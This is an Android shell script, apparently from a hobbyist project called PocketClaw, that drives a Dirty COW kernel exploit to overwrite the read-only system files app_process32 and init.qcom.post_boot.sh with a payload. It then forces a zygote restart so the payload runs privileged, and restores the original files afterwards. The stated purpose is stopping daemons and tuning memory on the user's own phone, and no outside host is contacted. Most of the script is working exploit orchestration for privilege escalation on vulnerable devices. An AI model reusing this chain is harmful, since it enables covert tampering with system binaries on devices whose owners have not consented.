#!/system/bin/sh
# PocketClaw daemon stopper + kernel tuning — runs from ADB shell after reboot.
# Requires in /data/local/tmp/:
#   dirtycow, payload, app_process32.orig, post_boot_tuned.sh, post_boot_original.sh
#
# Two-phase Dirty COW:
# Phase 1: COW init.qcom.post_boot.sh → sysctl-tuned version
# Phase 2: COW app_process32 → payload (daemon stop + ctl.start + LMK tune)
# Restorer: restores both files after payload runs

DIRTYCOW=/data/local/tmp/dirtycow
PAYLOAD=/data/local/tmp/payload
ORIG=/data/local/tmp/app_process32.orig
TARGET=/system/bin/app_process32
POST_BOOT=/system/etc/init.qcom.post_boot.sh
POST_BOOT_TUNED=/data/local/tmp/post_boot_tuned.sh
POST_BOOT_ORIG=/data/local/tmp/post_boot_original.sh

# Sanity check
for f in "$DIRTYCOW" "$PAYLOAD" "$ORIG" "$POST_BOOT_TUNED" "$POST_BOOT_ORIG"; do
    if [ ! -f "$f" ]; then
        echo "MISSING: $f"
        exit 1
    fi
done

echo "=== PocketClaw daemon stopper + kernel tuning ==="

# Capture BEFORE state
echo ""
echo "--- BEFORE ---"
echo "Daemons:"
ps | grep -E 'drmserver|mm-qcamera|audiod|rild' | grep -v grep || echo "  (none)"
echo "Kernel:"
echo "  vfs_cache_pressure: $(cat /proc/sys/vm/vfs_cache_pressure)"
echo "  extra_free_kbytes:  $(cat /proc/sys/vm/extra_free_kbytes)"
echo "  min_free_kbytes:    $(cat /proc/sys/vm/min_free_kbytes)"
echo "  LMK minfree:        $(cat /sys/module/lowmemorykiller/parameters/minfree)"
grep -E 'MemFree|Slab|SReclaimable' /proc/meminfo

# Get current zygote PID via /proc
ORIG_PID=""
for p in $(ls /proc | grep '^[0-9]'); do
    if [ -f /proc/$p/cmdline ]; then
        CMD=$(cat /proc/$p/cmdline 2>/dev/null | tr '\0' ' ')
        case "$CMD" in
            *zygote*)
                ORIG_PID=$p
                break
                ;;
        esac
    fi
done
if [ -z "$ORIG_PID" ]; then
    echo "Cannot find zygote PID"
    exit 1
fi
echo ""
echo "Zygote PID: $ORIG_PID"

# Phase 1: COW init.qcom.post_boot.sh with sysctl-tuned version
echo ""
echo "Phase 1: COW post_boot.sh with sysctl script..."
$DIRTYCOW "$POST_BOOT" "$POST_BOOT_TUNED"

# Phase 2: Hang system + COW app_process32
echo ""
echo "Phase 2: am hang --allow-restart..."
am hang --allow-restart &
AM_PID=$!
sleep 2

echo "Phase 2: COW app_process32..."
$DIRTYCOW "$TARGET" "$PAYLOAD"
echo "Waiting for watchdog to kill zygote PID $ORIG_PID..."

# Background restorer — polls /proc/$ORIG_PID existence
(
    while [ -d /proc/$ORIG_PID ]; do
        sleep 2
    done
    echo "Restorer: zygote died"

    # Wait for payload + post_boot to finish their work
    sleep 8

    # Restore app_process32 first (critical)
    echo "Restorer: restoring app_process32..."
    $DIRTYCOW "$TARGET" "$ORIG"

    # Restore post_boot.sh
    echo "Restorer: restoring post_boot.sh..."
    $DIRTYCOW "$POST_BOOT" "$POST_BOOT_ORIG"

    echo "Restorer: done."
) &
RESTORER_PID=$!

# Wait for the whole sequence
WAITED=0
while [ $WAITED -lt 240 ]; do
    if ! kill -0 $RESTORER_PID 2>/dev/null; then
        echo "Restorer finished after ${WAITED}s."
        break
    fi
    if [ $((WAITED % 30)) -eq 0 ] && [ $WAITED -gt 0 ]; then
        echo "  ...waiting (${WAITED}s elapsed)"
    fi
    sleep 5
    WAITED=$((WAITED + 5))
done

if kill -0 $RESTORER_PID 2>/dev/null; then
    echo "TIMEOUT: restorer still running after 240s. Killing."
    kill $RESTORER_PID 2>/dev/null
fi

# Cleanup
kill $AM_PID 2>/dev/null || true

# Wait for real zygote to come back
echo ""
echo "Waiting for zygote restart..."
VWAIT=0
while [ $VWAIT -lt 60 ]; do
    FINAL_PID=""
    for p in $(ls /proc | grep '^[0-9]'); do
        CMD=$(cat /proc/$p/cmdline 2>/dev/null | tr '\0' ' ')
        case "$CMD" in
            *zygote*)
                FINAL_PID=$p
                break
                ;;
        esac
    done
    if [ -n "$FINAL_PID" ] && [ "$FINAL_PID" != "$ORIG_PID" ]; then
        break
    fi
    sleep 2
    VWAIT=$((VWAIT + 2))
done

echo ""
echo "=== RESULTS ==="
echo "Zygote PID: $ORIG_PID -> ${FINAL_PID:-NONE}"
echo ""
echo "Daemons after:"
ps | grep -E 'drmserver|mm-qcamera|audiod|rild' | grep -v grep || echo "  (none running)"
echo ""
echo "Kernel after:"
echo "  vfs_cache_pressure: $(cat /proc/sys/vm/vfs_cache_pressure)"
echo "  extra_free_kbytes:  $(cat /proc/sys/vm/extra_free_kbytes)"
echo "  min_free_kbytes:    $(cat /proc/sys/vm/min_free_kbytes)"
echo "  LMK minfree:        $(cat /sys/module/lowmemorykiller/parameters/minfree)"
grep -E 'MemFree|Slab|SReclaimable' /proc/meminfo
echo "Done."
